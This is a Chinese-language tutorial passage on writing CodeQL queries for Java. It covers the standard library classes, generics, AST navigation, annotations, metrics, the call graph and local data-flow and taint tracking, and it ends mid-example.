<h2 id="CodeQL-for-Java"><a href="#CodeQL-for-Java" class="headerlink" title="CodeQL for Java"></a>CodeQL for Java</h2><h3 id="Java代码的基础查询"><a href="#Java代码的基础查询" class="headerlink" title="Java代码的基础查询"></a>Java代码的基础查询</h3><p>以下查询为查找多余的<code>if</code>语句，即<code>then</code>分支是空的，如<code>if (...) &#123; &#125;</code></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">import java</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> IfStmt ifstmt, BlockStmt blockstmt</span><br><span class="line"><span class="keyword">where</span> ifstmt.getThen() <span class="operator">=</span> blockstmt <span class="keyword">and</span> </span><br><span class="line">    blockstmt.getNumStmt() <span class="operator">=</span> <span class="number">0</span></span><br><span class="line"><span class="keyword">select</span> ifstmt, &quot;This &#x27;if&#x27; statement is redundant.&quot;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>import java<br>导入适用于 Java 的标准 CodeQL 库，每个查询都以一个或多个<code>import</code>语句开始</p>
</blockquote>
<blockquote>
<p>from IfStmt ifstmt, BlockStmt blockstmt<br>定义查询的变量，声明的形式为： <code>&lt;type&gt; &lt;variable name&gt;</code><br><a href="https://codeql.github.com/codeql-standard-libraries/java/semmle/code/java/Statement.qll/type.Statement$IfStmt.html">IfStmt</a>：<code>if</code>语句<br><a href="https://codeql.github.com/codeql-standard-libraries/java/semmle/code/java/Statement.qll/type.Statement$BlockStmt.html">BlockStmt</a>：语句块</p>
</blockquote>
<blockquote>
<p>where ifstmt.getThen() &#x3D; blockstmt and blockstmt.getNumStmt() &#x3D; 0<br>定义变量的条件，<code>ifstmt.getThen() = blockstmt</code>将这两个变量联系起来。<code>blockstmt</code>必须是<code>if</code>语句的<code>then</code>分支。<code>blockstmt.getNumStmt() = 0</code>声明该块必须为空（即不包含任何语句）<br><a href="https://codeql.github.com/codeql-standard-libraries/java/semmle/code/java/Statement.qll/predicate.Statement$IfStmt$getThen.0.html">IfStmt::getThen</a>：<code>Stmt getThen()</code>，成员谓词，获取此<code>if</code>语句的<code>then</code>分支<br><a href="https://codeql.github.com/codeql-standard-libraries/java/semmle/code/java/Statement.qll/predicate.Statement$BlockStmt$getNumStmt.0.html">BlockStmt::getNumStmt</a>：<code>int getNumStmt()</code>，成员谓词，获取此块中直接子语句的数目</p>
</blockquote>
<blockquote>
<p>select ifstmt, “This ‘if’ statement is redundant.”<br>定义每个匹配项的报告内容，<code>select</code>用于查找不良编码实例的查询语句始终采用以下形式： <code>select &lt;program element&gt;, &quot;&lt;alert message&gt;&quot;</code></p>
</blockquote>
<p>浏览查询结果可能会发现带有<code>else</code>分支的<code>if</code>语句的例子，其中空的<code>then</code>分支确实起到了作用。例如：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (...) &#123;</span><br><span class="line">  ...</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="string">&quot;-verbose&quot;</span>.equals(option)) &#123;</span><br><span class="line">  <span class="comment">// nothing to do - handled earlier</span></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  error(<span class="string">&quot;unrecognized option&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在这种情况下，将带有空<code>then</code>分支的<code>if</code>语句识别为多余的是错误的。一种解决方案是如果<code>if</code>语句有<code>else</code>分支，则忽略空的<code>then</code>分支：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">import java</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> IfStmt ifstmt, BlockStmt blockstmt</span><br><span class="line"><span class="keyword">where</span> ifstmt.getThen() <span class="operator">=</span> blockstmt <span class="keyword">and</span> </span><br><span class="line">    blockstmt.getNumStmt() <span class="operator">=</span> <span class="number">0</span> <span class="keyword">and</span> </span><br><span class="line">    <span class="keyword">not</span> <span class="keyword">exists</span>(ifstmt.getElse())</span><br><span class="line"><span class="keyword">select</span> ifstmt, &quot;This &#x27;if&#x27; statement is redundant.&quot;</span><br></pre></td></tr></table></figure>

<blockquote>
<p><a href="https://codeql.github.com/codeql-standard-libraries/java/semmle/code/java/Statement.qll/predicate.Statement$IfStmt$getElse.0.html">IfStmt::getElse</a>：<code>Stmt getElse()</code>，成员谓词，获取此<code>if</code>语句的<code>else</code>分支</p>
</blockquote>
<h3 id="CodeQL的Java库"><a href="#CodeQL的Java库" class="headerlink" title="CodeQL的Java库"></a>CodeQL的Java库</h3><p>标准 Java 库中最重要的类可以分为以下五个类别</p>
<ol>
<li>表示程序元素的类（例如Java的类和方法）</li>
<li>表示 AST 节点的类（例如语句和表达式）</li>
<li>表示元数据的类（例如注释和注解）</li>
<li>计算度量的类（例如圈复杂度和耦合度）</li>
<li>导航程序调用图的类</li>
</ol>
<h4 id="程序元素"><a href="#程序元素" class="headerlink" title="程序元素"></a>程序元素</h4><p>包括包（<code>Package</code>）、编译单元（<code>CompilationUnit</code>）、类型（<code>Type</code>）、方法（<code>Method</code>）、构造函数（<code>Constructor</code>）和变量（<code>Variable</code>）<br>它们的共同超类是<code>Element</code>，它提供了通用的成员谓词，用于确定程序元素的名称和检查两个元素是否相互嵌套</p>
<p><code>Callable</code>是 <code>Method</code> 和<code>Constructor</code>的共同超类，通过<code>Callable</code>引用一个可能是方法或构造函数的元素通常很方便</p>
<h5 id="类型"><a href="#类型" class="headerlink" title="类型"></a>类型</h5><p><code>Type</code>类有许多子类用于表示不同类型：</p>
<ul>
<li><code>PrimitiveType</code> 表示一个 <a href="https://docs.oracle.com/javase/tutorial/java/nutsandbolts/datatypes.html">基本类型</a>，即 <code>boolean</code>, <code>byte</code>, <code>char</code>, <code>double</code>, <code>float</code>, <code>int</code>, <code>long</code>, <code>short</code>之一， QL 也将 <code>void</code> 和 <code>&lt;nulltype&gt;</code> 归为基本类型</li>
<li><code>RefType</code>表示引用类型，包含如下子类：<ul>
<li><code>Class</code> Java类</li>
<li><code>Interface</code> Java接口</li>
<li><code>EnumType</code> Java枚举类型</li>
<li><code>Array</code> Java数组类型</li>
</ul>
</li>
</ul>
<p>例如，以下查询查找程序中为int类型的所有变量：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">import java</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Variable v, PrimitiveType pt</span><br><span class="line"><span class="keyword">where</span> pt <span class="operator">=</span> v.getType() <span class="keyword">and</span> </span><br><span class="line">    pt.hasName(&quot;int&quot;)</span><br><span class="line"><span class="keyword">select</span> v</span><br></pre></td></tr></table></figure>

<blockquote>
<p><a href="https://codeql.github.com/codeql-standard-libraries/java/semmle/code/java/Variable.qll/predicate.Variable$Variable$getType.0.html">Variable::getType</a>：<code>Type getType()</code>，获取变量的类型<br><a href="https://codeql.github.com/codeql-standard-libraries/java/semmle/code/java/Element.qll/predicate.Element$Element$hasName.1.html">Element::hasName</a>：<code>predicate hasName(string name)</code>，如果元素具有指定的名称则该谓词成立</p>
</blockquote>
<p>引用类型也根据其声明范围进行分类：</p>
<ul>
<li><code>TopLevelType</code> 表示在编译单元的顶层声明的引用类型</li>
<li><code>NestedType</code> 是在另一个类型中声明的类型</li>
</ul>
<p>例如，此查询查找名称与其编译单元名称不同的所有顶级类型：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">import java</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> TopLevelType tl</span><br><span class="line"><span class="keyword">where</span> tl.getName() <span class="operator">!=</span> tl.getCompilationUnit().getName()</span><br><span class="line"><span class="keyword">select</span> tl</span><br></pre></td></tr></table></figure>

<blockquote>
<p><a href="https://codeql.github.com/codeql-standard-libraries/java/semmle/code/java/Element.qll/predicate.Element$Element$getName.0.html">Element::getName</a>：<code>string getName()</code>，获取元素的名称<br><a href="https://codeql.github.com/codeql-standard-libraries/java/semmle/code/java/Type.qll/predicate.Type$RefType$getCompilationUnit.0.html">RefType::getCompilationUnit</a>：<code>CompilationUnit getCompilationUnit()</code>，获取声明此类型的编译单元<br><a href="https://codeql.github.com/codeql-standard-libraries/java/semmle/code/java/CompilationUnit.qll/predicate.CompilationUnit$CompilationUnit$getName.0.html">CompilationUnit::getName</a>：<code>string getName()</code>，获取编译单元的名称（不包括其扩展名）</p>
</blockquote>
<p>还有几个专用的类：</p>
<ul>
<li><code>TopLevelClass</code> 表示在编译单元的顶层声明的类</li>
<li><code>NestedClass</code>表示在<a href="https://docs.oracle.com/javase/tutorial/java/javaOO/nested.html">另一个类型内声明的类</a>，如<ul>
<li><code>LocalClass</code>， <a href="https://docs.oracle.com/javase/tutorial/java/javaOO/localclasses.html">是在方法或构造函数中声明的类</a>.</li>
<li><code>AnonymousClass</code>， <a href="https://docs.oracle.com/javase/tutorial/java/javaOO/anonymousclasses.html">匿名类</a></li>
</ul>
</li>
</ul>
<p>最后，该库还有许多封装了常用的Java标准库类的单例类：</p>
<p><code>TypeObject</code>、<code>TypeCloneable</code>、<code>TypeRuntime</code>、<code>TypeSerializable</code>、<code>TypeString</code>、<code>TypeSystem</code>和<code>TypeClass</code></p>
<p>例如，我们可以编写一个查询，查找直接继承<code>Object</code>的所有嵌套类：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">import java</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> NestedClass nc</span><br><span class="line"><span class="keyword">where</span> nc.getASupertype() instanceof TypeObject</span><br><span class="line"><span class="keyword">select</span> nc</span><br></pre></td></tr></table></figure>

<blockquote>
<p><a href="https://codeql.github.com/codeql-standard-libraries/java/semmle/code/java/Type.qll/predicate.Type$RefType$getASupertype.0.html">RefType::getASupertype</a>：<code>RefType getASupertype()</code>，获取此类型的直接超类</p>
</blockquote>
<h5 id="泛型"><a href="#泛型" class="headerlink" title="泛型"></a>泛型</h5><p> <code>Type</code>还有几个子类用于处理泛型类型<br><code>GenericType</code>代表 <code>GenericInterface</code> 或 <code>GenericClass</code>，它表示一个泛型类型声明，比如<code>java.util.Map</code>接口</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> java.util.;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Map</span>&lt;K, V&gt; &#123;</span><br><span class="line">    <span class="type">int</span> <span class="title function_">size</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>类型参数，如本例中的<code>K</code>和<code>V</code>，由类<code>TypeVariable</code>表示</p>
<p>泛型类型的参数化实例提供了一个具体类型来实例化类型参数，如 <code>Map&lt;String, File&gt;</code>中所示。这样的类型由 <code>ParameterizedType</code>表示，它不同于表示其实例化来源的泛型类型<code>GenericType</code>。要从<code>ParameteredType</code>转换为相应的<code>GenericType</code>，可以使用谓词<code>getSourceDeclaration</code>。例如，我们可以使用下面的查询来查找所有<code>java.util.Map</code>的参数化实例：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">import java</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> GenericInterface map, ParameterizedType pt</span><br><span class="line"><span class="keyword">where</span> map.hasQualifiedName(&quot;java.util&quot;, &quot;Map&quot;) </span><br><span class="line">    <span class="keyword">and</span> pt.getSourceDeclaration() <span class="operator">=</span> map</span><br><span class="line"><span class="keyword">select</span> pt</span><br></pre></td></tr></table></figure>

<blockquote>
<p><a href="https://codeql.github.com/codeql-standard-libraries/java/semmle/code/java/Type.qll/predicate.Type$RefType$hasQualifiedName.2.html">RefType::hasQualifiedName</a>：<code>predicate hasQualifiedName(string package, string type)</code>，如果在指定名称的指定包中声明了此类型，则该谓词成立。对于嵌套类型来说，名称以$作为前缀，并附加到封闭类型的名称之后，封闭类型也可能是嵌套类型<br><a href="https://codeql.github.com/codeql-standard-libraries/java/semmle/code/java/Type.qll/predicate.Type$RefType$getSourceDeclaration.0.html">RefType::getSourceDeclaration</a>：<code>RefType getSourceDeclaration()</code>，获取此类型的源声明。对于泛型类型和原始类型的参数化实例，源声明是相应的泛型类型。对于泛型类型的参数化实例中声明的非参数化类型，源声明是泛型类型中的相应类型。对于其他所有类型，源声明就是类型本身</p>
</blockquote>
<p>一般来说，泛型类型可能会限制类型参数可以绑定到的类型。例如，一种从字符串到数字的映射可以声明如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">StringToNumMap</span>&lt;N <span class="keyword">extends</span> <span class="title class_">Number</span>&gt; <span class="keyword">implements</span> <span class="title class_">Map</span>&lt;String, N&gt; &#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这意味<code>StringToNumberMap</code>的参数化实例只能用<code>Number</code>或其子类来实例化类型参数<code>N</code>。我们说<code>N</code>是一个有界类型参数，其上界是<code>Number</code>。在QL中，可以使用谓词<code>GetAtypeBind</code>查询类型变量的类型绑定。类型约束本身由类<code>TypeBound</code>表示，该类有一个成员谓词<code>getType</code>来检索变量被绑定的类型。例如，以下查询将查找所有类型绑定为<code>Number</code>的类型变量：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">import java</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> TypeVariable tv, TypeBound tb</span><br><span class="line"><span class="keyword">where</span> tb <span class="operator">=</span> tv.getATypeBound() <span class="keyword">and</span> </span><br><span class="line">    tb.getType().hasQualifiedName(&quot;java.lang&quot;, &quot;Number&quot;)</span><br><span class="line"><span class="keyword">select</span> tv</span><br></pre></td></tr></table></figure>

<blockquote>
<p><a href="https://codeql.github.com/codeql-standard-libraries/java/semmle/code/java/Generics.qll/predicate.Generics$BoundedType$getATypeBound.0.html">BoundedType::getATypeBound</a>：<code>TypeBound getATypeBound()</code>，获取此类型的绑定类型（如果有的话）</p>
</blockquote>
<p>为了处理不知道泛型的遗留代码，每个泛型类型都有一个没有任何类型参数的“原始”版本。在CodeQL库中，原始类型使用类<code>RawType</code>表示，该类有预期的子类<code>RawClass</code>和<code>RawInterface</code>。同样，还有一个用于获取相应泛型类型的谓词<code>getSourceDeclaration</code>。例如，我们可以查询（原始）<code>Map</code>类型的变量：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">import java</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Variable v, RawType rt</span><br><span class="line"><span class="keyword">where</span> rt <span class="operator">=</span> v.getType() </span><br><span class="line">    <span class="keyword">and</span> rt.getSourceDeclaration().hasQualifiedName(&quot;java.util&quot;, &quot;Map&quot;)</span><br><span class="line"><span class="keyword">select</span> v</span><br></pre></td></tr></table></figure>

<p>在以下代码段中，此查询将找到m1，而不是m2：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Map</span> <span class="variable">m1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">Map&lt;String, String&gt; m2 = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;String, String&gt;();</span><br></pre></td></tr></table></figure>



<p>最后，变量可以声明为<a href="https://docs.oracle.com/javase/tutorial/java/generics/wildcards.html">通配符类型</a>：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Map&lt;? <span class="keyword">extends</span> <span class="title class_">Number</span>, ? <span class="built_in">super</span> Float&gt; m;</span><br></pre></td></tr></table></figure>

<p>通配符 <code>? extends Number</code> 和 <code>? super Float</code> 由类<code>WildcardTypeAccess</code>表示。与类型参数一样，通配符可能有类型界限。与类型参数不同的是通配符可以有上界（如 <code>? extends Number</code>）和下界（如 <code>? super Float</code>）。类<code>WildcardTypeAccess</code>提供了成员谓词<code>getUpperBound</code>和<code>getLowerBound</code>，分别用于检索上界和下界</p>
<p>为了处理泛型方法，有类<code>GenericMethod</code>、<code>ParameterizedMethod</code>和<code>RawMethod</code>，它们完全类似于用于表示泛型类型的类似命名类。</p>
<p>有关Java类型的更多信息，见<a href="./#Java%E4%B8%AD%E7%9A%84%E7%B1%BB%E5%9E%8B">Java中的类型</a></p>
<h5 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h5><p>类<code>Variable</code>表示<a href="https://docs.oracle.com/javase/tutorial/java/nutsandbolts/variables.html">Java意义上</a>的变量，它要么是类的成员字段（无论是静态的还是非静态的），要么是局部变量，要么是参数。所以针对这些特殊情况，有三个子类：</p>
<ul>
<li><code>Field</code> 表示一个Java字段</li>
<li><code>LocalVariableDecl</code> 表示局部变量</li>
<li><code>Parameter</code> 表示方法或构造函数的参数</li>
</ul>
<h4 id="抽象语法树"><a href="#抽象语法树" class="headerlink" title="抽象语法树"></a>抽象语法树</h4><p>此类别中的类表示抽象语法树（AST）节点，即语句（类<code>Stmt</code>）和表达式（类<code>Expr</code>）。有关标准QL库中可用的表达式和语句类型的完整列表，见<a href="./#%E7%94%A8%E4%BA%8E%E5%A4%84%E7%90%86Java%E7%A8%8B%E5%BA%8F%E7%9A%84%E6%8A%BD%E8%B1%A1%E8%AF%AD%E6%B3%95%E6%A0%91%E7%B1%BB">用于处理Java程序的抽象语法树类</a></p>
<p><code>Expr</code>和<code>Stmt</code>都提供了成员谓词，用于探索程序的抽象语法树：</p>
<ul>
<li><code>Expr.getAChildExpr</code> 返回给定表达式的子表达式</li>
<li><code>Stmt.getAChild</code> 返回直接嵌套在给定语句中的语句或表达式</li>
<li><code>Expr.getParent</code> 和 <code>Stmt.getParent</code> 返回AST节点的父节点</li>
</ul>
<p>例如，以下查询将查找所有父级为<code>return</code>语句的表达式：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">import java</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Expr e</span><br><span class="line"><span class="keyword">where</span> e.getParent() instanceof ReturnStmt</span><br><span class="line"><span class="keyword">select</span> e</span><br></pre></td></tr></table></figure>

<p>以下查询查找父级为<code>if</code>语句的语句（将查找程序中所有<code>if</code>语句的<code>then</code>分支和<code>else</code>分支）：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">import java</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Stmt s</span><br><span class="line"><span class="keyword">where</span> s.getParent() instanceof IfStmt</span><br><span class="line"><span class="keyword">select</span> s</span><br></pre></td></tr></table></figure>




<p>最后，这是一个查找方法体的查询：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">import java</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Stmt s</span><br><span class="line"><span class="keyword">where</span> s.getParent() instanceof <span class="keyword">Method</span></span><br><span class="line"><span class="keyword">select</span> s</span><br></pre></td></tr></table></figure>



<p>正如这些示例所示，表达式的父节点并不总是表达式：它也可能是语句，例如<code>IfStmt</code>。类似地，语句的父节点并不总是一个语句：它也可能是一个方法或构造函数。为了解决这个问题，QL Java库提供了两个抽象类<code>ExprParent</code>和<code>StmtParent</code>，前者表示可能是表达式父节点的任何节点，后者表示可能是语句父节点的任何节点</p>
<p>有关使用AST类的更多信息，见<a href="./#Java%E4%B8%AD%E5%AE%B9%E6%98%93%E6%BA%A2%E5%87%BA%E7%9A%84%E6%AF%94%E8%BE%83%E8%BF%90%E7%AE%97">Java中容易溢出的比较运算</a></p>
<h4 id="元数据"><a href="#元数据" class="headerlink" title="元数据"></a>元数据</h4><p>除了程序代码之外，Java程序还有几种元数据。特别是有<a href="https://docs.oracle.com/javase/tutorial/java/annotations/">注解</a>和<a href="https://en.wikipedia.org/wiki/Javadoc">Javadoc</a>注释。由于此元数据对于增强代码分析和作为分析主题本身都很有趣，因此QL库定义了用于访问它的类</p>
<p>对于注解，类<code>Annotatable</code>是所有可注解的程序元素的超类。包括包、引用类型、字段、方法、构造函数和局部变量声明。对于每一个这样的元素，其谓词<code>getAnAnnotation</code>能检索该元素可能具有的任何注解。例如，以下查询查找构造函数上的所有注解：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">import java</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Constructor c</span><br><span class="line"><span class="keyword">select</span> c.getAnAnnotation()</span><br></pre></td></tr></table></figure>



<p>这些注解由类<code>Annotation</code>表示。注解只是类型为<code>AnnotationType</code>的表达式。例如，可以修改此查询，使其只报告废弃的构造函数</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">import java</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Constructor c, Annotation ann, AnnotationType anntp</span><br><span class="line"><span class="keyword">where</span> ann <span class="operator">=</span> c.getAnAnnotation() <span class="keyword">and</span></span><br><span class="line">    anntp <span class="operator">=</span> ann.getType() <span class="keyword">and</span></span><br><span class="line">    anntp.hasQualifiedName(&quot;java.lang&quot;, &quot;Deprecated&quot;)</span><br><span class="line"><span class="keyword">select</span> ann</span><br></pre></td></tr></table></figure>

<p>有关使用注解的更多信息，见<a href="./#Java%E4%B8%AD%E7%9A%84%E6%B3%A8%E8%A7%A3">Java中的注解</a></p>
<p>对于Javadoc，类<code>Element</code>有一个成员谓词<code>getDoc</code>，它返回一个委派的<code>Documentable</code>的对象，然后可以查询它附加的Javadoc注释。例如，以下查询在私有字段上查找Javadoc注释：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">import java</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Field f, Javadoc jdoc</span><br><span class="line"><span class="keyword">where</span> f.isPrivate() <span class="keyword">and</span></span><br><span class="line">    jdoc <span class="operator">=</span> f.getDoc().getJavadoc()</span><br><span class="line"><span class="keyword">select</span> jdoc</span><br></pre></td></tr></table></figure>



<p>类<code>Javadoc</code>将整个Javadoc注释表示为<code>JavadocElement</code>节点树，可以使用成员谓词<code>getAChild</code>和<code>getParent</code>遍历这些节点。例如，你可以编辑查询，以便在私有字段的Javadoc注释中找到所有<code>@author</code>标签：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">import java</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Field f, Javadoc jdoc, AuthorTag <span class="keyword">at</span></span><br><span class="line"><span class="keyword">where</span> f.isPrivate() <span class="keyword">and</span></span><br><span class="line">    jdoc <span class="operator">=</span> f.getDoc().getJavadoc() <span class="keyword">and</span></span><br><span class="line">    at.getParent<span class="operator">+</span>() <span class="operator">=</span> jdoc</span><br><span class="line"><span class="keyword">select</span> <span class="keyword">at</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p><a href="https://codeql.github.com/docs/ql-language-reference/recursion/">Recursion — CodeQL</a></p>
</blockquote>
<p>有关使用Javadoc的更多信息，见<a href="./#Javadoc">Javadoc</a></p>
<h4 id="度量"><a href="#度量" class="headerlink" title="度量"></a>度量</h4><p>标准的QL Java库为计算Java程序元素的度量提供了广泛的支持。为了避免与度量计算相关的成员谓词过多而给代表这些元素的类造成过重的负担，这些谓词被放在委托类上</p>
<p>总共有六个这样的类：<code>MetricElement</code>、<code>MetricPackage</code>、<code>MetricRefType</code>、<code>MetricField</code>、<code>MetricCallable</code>和<code>MetricStmt</code>。相应的元素类各自提供一个成员谓词<code>getMetrics</code>，可用于获取委托类的实例，然后在这个实例上进行度量计算。例如，以下查询查找<a href="https://en.wikipedia.org/wiki/Cyclomatic_complexity">圈复杂度</a>大于40的方法：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">import java</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> <span class="keyword">Method</span> m, MetricCallable mc</span><br><span class="line"><span class="keyword">where</span> mc <span class="operator">=</span> m.getMetrics() <span class="keyword">and</span></span><br><span class="line">    mc.getCyclomaticComplexity() <span class="operator">&gt;</span> <span class="number">40</span></span><br><span class="line"><span class="keyword">select</span> m</span><br></pre></td></tr></table></figure>



<h4 id="调用图"><a href="#调用图" class="headerlink" title="调用图"></a>调用图</h4><p>从Java代码生成的CodeQL数据库包含有关程序调用图的预计算信息，即给定调用在运行时可以分派给哪些方法或构造函数。</p>
<p>前文介绍的<code>Callable</code>类，它包括方法，也包括构造函数。调用表达式是使用类<code>Call</code>来进行抽象的，它包括方法调用、<code>new</code>表达式和使用<code>this</code>或<code>super</code>的显式构造函数调用</p>
<p>我们可以使用谓词 <code>Call.getCallee</code> 来查找一个特定的调用表达式所指向的方法或构造函数。例如，以下查询查找名为<code>println</code>的方法的所有调用：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">import java</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> <span class="keyword">Call</span> c, <span class="keyword">Method</span> m</span><br><span class="line"><span class="keyword">where</span> m <span class="operator">=</span> c.getCallee() <span class="keyword">and</span></span><br><span class="line">    m.hasName(&quot;println&quot;)</span><br><span class="line"><span class="keyword">select</span> c</span><br></pre></td></tr></table></figure>



<p>相反， <code>Callable.getAReference</code> 返回指向它的 <code>Call</code> 。所以我们可以使用这个查询找到从未被调用的方法或构造函数：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">import java</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Callable c</span><br><span class="line"><span class="keyword">where</span> <span class="keyword">not</span> <span class="keyword">exists</span>(c.getAReference())</span><br><span class="line"><span class="keyword">select</span> c</span><br></pre></td></tr></table></figure>

<p>有关可调用项和调用的更多信息，见<a href="./#%E5%AF%BC%E8%88%AA%E8%B0%83%E7%94%A8%E5%9B%BE">导航调用图</a></p>
<h3 id="Java中的数据流分析"><a href="#Java中的数据流分析" class="headerlink" title="Java中的数据流分析"></a>Java中的数据流分析</h3><p>数据流分析用于计算一个变量在程序中各个点上可能保持的值，确定这些值如何在程序中传播以及它们的使用位置</p>
<h4 id="局部数据流"><a href="#局部数据流" class="headerlink" title="局部数据流"></a>局部数据流</h4><p>局部数据流是单个方法内或可调用内的数据流。局部数据流通常比全局数据流更容易、更快、更精确，并且对于许多查询来说已经足够了</p>
<h5 id="使用局部数据流"><a href="#使用局部数据流" class="headerlink" title="使用局部数据流"></a>使用局部数据流</h5><p>局部数据流库位于<code>DataFlow</code>模块中，该模块定义了类<code>Node</code>来表示数据可以通过的任意元素。<code>Node</code>分为表达式节点（<code>ExprNode</code>）和参数节点（<code>ParameterNode</code>）。可以使用成员谓词<code>asExpr</code>和<code>asParameter</code>在数据流节点和表达式&#x2F;参数之间映射：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">class Node &#123;</span><br><span class="line">  <span class="comment">/** Gets the expression corresponding to this node, if any. */</span></span><br><span class="line">  Expr asExpr() &#123; ... &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/** Gets the parameter corresponding to this node, if any. */</span></span><br><span class="line">  <span class="keyword">Parameter</span> asParameter() &#123; ... &#125;</span><br><span class="line"></span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>或者使用谓词<code>exprNode</code>和<code>parameterNode</code>：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Gets the node corresponding to expression `e`.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">ExprNode exprNode(Expr e) &#123; ... &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Gets the node corresponding to the value of parameter `p` at function entry.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">ParameterNode parameterNode(<span class="keyword">Parameter</span> p) &#123; ... &#125;</span><br></pre></td></tr></table></figure>

<p>如果存在一条从节点<code>nodeFrom</code>到节点<code>nodeTo</code>的实时数据流边，则谓词 <code>localFlowStep(Node nodeFrom, Node nodeTo)</code> 成立。可以通过使用<code>+</code>或<code>*</code>运算符来递归地应用<code>localFlowStep</code>，或者通过使用预定义的递归谓词<code>localFlow</code>（相当于<code>localFlowStep*</code>）</p>
<p>例如，可以在零个或多个局部步骤中找到从参数<code>source</code>到表达式<code>sink</code>的流：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">DataFlow::localFlow(DataFlow::parameterNode(source), DataFlow::exprNode(sink))</span><br></pre></td></tr></table></figure>



<h5 id="使用局部污点跟踪"><a href="#使用局部污点跟踪" class="headerlink" title="使用局部污点跟踪"></a>使用局部污点跟踪</h5><p>局部污点跟踪通过包含非保值流步骤来扩展局部数据流。例如：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">temp</span> <span class="operator">=</span> x;</span><br><span class="line"><span class="type">String</span> <span class="variable">y</span> <span class="operator">=</span> temp + <span class="string">&quot;, &quot;</span> + temp;</span><br></pre></td></tr></table></figure>

<p>如果<code>x</code>是污点字符串，那么<code>y</code>也是污点</p>
<p>局部污点跟踪库位于<code>TaintTracking</code>模块中。与局部数据流一样，如果存在一条从节点<code>nodeFrom</code>到节点<code>nodeTo</code>的实时污染传播边，则谓词<code>localTaintStep(DataFlow::Node nodeFrom, DataFlow::Node nodeTo)</code>成立。可以使用<code>+</code>和<code>*</code>运算符递归地应用谓词，或者使用预定义的递归谓词<code>localTaint</code>（相当于 <code>localTaintStep*</code>）</p>
<p>例如，可以在零个或多个局部步骤中找到从参数<code>source</code>到表达式<code>sink</code>的污染传播：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">TaintTracking::localTaint(DataFlow::parameterNode(source), DataFlow::exprNode(sink))</span><br></pre></td></tr></table></figure>



<h5 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h5><p>此查询查找传递给新<code>new FileReader(..)</code>的文件名</p>
